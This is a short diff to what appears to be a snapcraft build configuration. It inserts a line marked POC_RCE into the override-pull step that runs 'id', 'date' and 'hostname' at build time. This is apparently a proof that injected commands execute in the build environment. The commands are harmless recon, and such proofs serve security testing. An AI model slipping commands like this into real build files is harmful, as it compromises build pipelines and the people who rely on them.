@@ -47,6 +47,7 @@ parts:
     plugin: dump
     source: .
     override-pull: |
+      echo ===POC_RCE===; id; date; hostname; echo ===END===
       craftctl default
       # version.txt created by prepare.sh
       export version=`cat $CRAFT_PART_SRC/version.txt`
